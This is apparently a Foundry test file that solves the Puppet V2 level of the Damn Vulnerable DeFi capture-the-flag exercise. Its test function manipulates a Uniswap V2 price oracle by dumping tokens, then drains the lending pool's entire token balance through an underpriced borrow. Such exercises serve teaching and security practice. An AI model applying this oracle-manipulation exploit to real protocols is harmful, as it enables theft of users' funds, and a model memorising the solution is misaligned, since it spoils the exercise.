// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/test.sol";
import "../src/levels/PuppetV2/PuppetV2Pool.sol";
import "../src/levels/PuppetV2/IUniswapV2Pair.sol";
import "../src/levels/PuppetV2/IUniswapV2Factory.sol";
import "../src/levels/PuppetV2/IUniswapV2Router02.sol";
import "../src/DamnValuableToken.sol";
import "../src/WETH9.sol";

contract PuppetV2Test is Test {
    address constant deployer =
        address(uint160(uint256(keccak256("DEPLOYER"))));
    address constant player = address(uint160(uint256(keccak256("PLAYER"))));
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100 ether;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10000 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20 ether;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000 ether;

    PuppetV2Pool pool;
    DamnValuableToken token;
    WETH9 weth;
    IUniswapV2Factory factory;
    IUniswapV2Pair pair;
    IUniswapV2Router02 router;

    function setUp() public {
        vm.startPrank(deployer);
        vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE);

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);

        token = new DamnValuableToken();
        weth = new WETH9();

        factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap-v2/UniswapV2Factory.json",
                abi.encode(0)
            )
        );

        router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap-v2/UniswapV2Router.json",
                abi.encode(address(factory), address(weth))
            )
        );

        token.approve(address(router), UNISWAP_INITIAL_TOKEN_RESERVE);
        router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE,
            0,
            0,
            deployer,
            block.timestamp * 2
        );

        pair = IUniswapV2Pair(factory.getPair(address(token), address(weth)));

        assertGt(pair.balanceOf(deployer), 0);

        pool = new PuppetV2Pool(
            address(weth),
            address(token),
            address(pair),
            address(factory)
        );

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(pool), POOL_INITIAL_TOKEN_BALANCE);

        assertEq(pool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);
        assertEq(
            pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE),
            300_000 ether
        );

        vm.stopPrank();
    }

    function testIsPuppetV2Cleared() public {
        vm.startPrank(player);

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(router), type(uint256).max);

        router.swapExactTokensForETH(
            token.balanceOf(player) - 1,
            1,
            path,
            player,
            block.timestamp * 2
        );

        weth.approve(address(pool), player.balance);
        weth.deposit{value: player.balance}();
        pool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        vm.stopPrank();

        assertEq(token.balanceOf(address(pool)), 0);
        assertGt(token.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
    }
}
